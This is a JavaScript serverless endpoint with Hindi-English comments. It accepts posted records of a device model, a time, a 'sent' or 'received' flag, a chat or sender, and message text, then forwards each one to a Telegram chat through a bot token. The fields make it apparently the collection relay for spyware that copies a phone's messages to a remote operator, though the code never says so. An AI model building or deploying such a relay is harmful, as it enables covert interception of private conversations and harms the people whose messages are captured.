export default async function handler(request, response) {
    if (request.method !== 'POST') {
        return response.status(405).json({ error: 'Method Not Allowed' });
    }

    const { accessKey, ...data } = request.body;
    const expectedApiKey = process.env.MY_SECRET_API_KEY;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!expectedApiKey || !botToken || !chatId) {
        return response.status(500).json({ error: 'Server config fucked up' });
    }

    if (accessKey !== expectedApiKey) {
        return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
    }

    if (Object.keys(data).length === 0) {
        return response.status(400).json({ error: 'No data received' });
    }

    try {
        // Data ko yahan extract kiya ja raha hai
        const model = data.model || data.device || 'Unknown Device';
        const time = data.time || new Date().toLocaleTimeString();
        const type = data.type || 'info';
        const chat = data.chat || data.from || 'N/A';
        const message = data.message || data.text || '';

        // Status ko yahan set kiya ja raha hai
        const status = type.toLowerCase().includes('sent') ? '📤 SENT' : '📥 RECEIVED';

        // Message ko tere style mein format kiya ja raha hai
        const formattedMessage = `
📱 ${model}
🕚 Time: ${time}

${status}

Chat: ${chat}
Message: ${message}
        `.trim();

        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        // Ab format kiya hua message bheja ja raha hai
        await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: formattedMessage,
                // Faltu ka Markdown hata diya hai
            }),
        });
        
        return response.status(200).json({ status: 'ok' });
    } catch (error) {
        console.error(error);
        return response.status(500).json({ error: 'Failed to forward data' });
    }
}
